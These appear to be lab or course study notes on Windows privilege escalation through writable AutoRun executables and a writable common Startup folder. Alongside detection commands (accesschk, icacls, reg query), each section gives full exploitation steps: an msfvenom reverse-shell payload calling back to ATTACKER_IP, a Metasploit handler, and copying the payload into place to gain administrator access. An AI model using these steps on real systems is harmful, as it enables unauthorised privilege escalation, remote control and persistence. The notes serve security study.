### AutoRun Executables

Windows can automatically execute programs when a user logs in. If an AutoRun executable is **writable by a low-privileged user** and an administrator logs in, replacing it with a payload can result in execution with the administrator's privileges.

Attack chain:
```text
AutoRun executable
        ↓
Writable by Everyone
        ↓
Replace executable with payload
        ↓
Administrator logs in
        ↓
Payload executes as Administrator
        ↓
Privilege Escalation
```

### Detection

Launch Autoruns:
```cmd
C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
```

* Autoruns64.exe → Third-party Sysinternals tool → NOT installed by default → Useful for comprehensive AutoRun enumeration

→ Open the **Logon** tab and look for programs executed during user logon.

Check the permissions of the AutoRun program:
```cmd
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
```
**Options:**
- `-w` → show objects with write permissions.
- `-v` → verbose output.
- `-u` → suppress errors / show useful results for user-access checks.

Or check the executable directly:
```cmd
C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
```
`/accepteula` automatically accepts AccessChk's EULA.

Look for:
```text
Everyone
FILE_ALL_ACCESS
```
`FILE_ALL_ACCESS` = full permissions over the file, allowing it to be modified/replaced.

### Registry Enumeration

AutoRun entries can also be found directly in the registry:
```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```
→ Lists programs configured to run when users log in.

**Breakdown:**
- `reg` → Windows Registry command-line utility.
- `query` → read registry values.
- `HKLM` → `HKEY_LOCAL_MACHINE`, system-wide settings.
- `...\Run` → programs executed during user logon.

* reg query → Built into Windows → Can manually inspect Registry Run Keys

### Exploitation — Replace AutoRun Executable

Create a reverse-shell payload on Kali:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=KALI_IP -f exe -o reverse.exe
```

Start Metasploit handler:
```text
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST KALI_IP
run
```

Copy the payload over the writable AutoRun executable:
```cmd
copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
```
`/Y` → overwrite without asking for confirmation.

Now wait for an administrator to log in.

When the payload executes, interact with the Meterpreter session:
```text
sessions -i <SESSION_ID>
```

Verify the account:
```text
getuid
```

Expected result: an **Administrator-level** identity.

### Key Idea
```text
HKLM\...\Run
        ↓
AutoRun executable
        ↓
Writable by low-privileged user
        ↓
Replace with payload
        ↓
Admin logs in
        ↓
Payload runs as Admin
```


---

# Windows Startup Folder

## Startup Folder

Windows automatically executes programs/shortcuts placed in certain **Startup folders when a user logs in**.

The important security issue is:
```text
Low-privileged user can write to Startup folder
        ↓
Administrator logs in
        ↓
Windows executes Startup item
        ↓
Payload runs as Administrator
```

This makes a writable **common Startup folder** a potential privilege-escalation and persistence vector.

#  Detection

The common Startup directory is:
```text
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
```

Check its permissions:
```cmd
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

Look for:
```text
BUILTIN\Users:(F)
```
`F` = **Full Control**.

This means members of the local `Users` group can potentially create or modify files in the Startup directory.

#  Why This Can Lead to Privilege Escalation

The important distinction is **who logs in**.

For example:
```text
C:\ProgramData\...\Startup
        ↑
Writable by normal users
        ↓
Normal user places payload
        ↓
Administrator logs in
        ↓
Startup item executes
        ↓
Payload runs in Administrator's session
```

The attacker does **not** necessarily need permission to start the payload themselves.

They only need to get the payload into the Startup folder and wait for the privileged user to log in.

#  Reverse Shell Using Meterpreter

```bash
msfconsole
```

Use the multi-handler:
```text
use multi/handler
```

Set the payload:
```text
set payload windows/meterpreter/reverse_tcp
```

Set your Kali IP:
```text
set LHOST ATTACKER_IP
```

Start the listener:
```text
run
```

# Create the Payload

Open another Kali terminal:
```bash
msfvenom -p windows/meterpreter/reverse_tcp \
LHOST=ATTACKER_IP \
-f exe \
-o x.exe
```

Transfer `x.exe` to the Windows machine.

# Place Payload in Startup

On Windows:
```cmd
copy x.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\x.exe"
```

Or place the file manually in:
```text
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
```

Because this is the **common Startup folder**, it applies to users who log into the machine, rather than only the current user's profile.

The payload will execute when the relevant user logs in.

When the Meterpreter session connects:
```text
getuid
```

Expected:
```text
Server username: User-PC\Admin
```

This demonstrates that the Startup payload executed in the administrator's logon context.

# Attack Chain
```text
Writable Startup folder
        ↓
Create/copy malicious x.exe
        ↓
Administrator logs in
        ↓
Windows executes Startup item
        ↓
Reverse shell
        ↓
Administrator context
```

## Key Idea

> **A Startup folder writable by low-privileged users can become a privilege-escalation vector if a privileged user subsequently logs in.**

For your folder structure, I would classify this as **`16_Persistence.md`**, with a subsection called **Startup Folder Privilege Escalation**.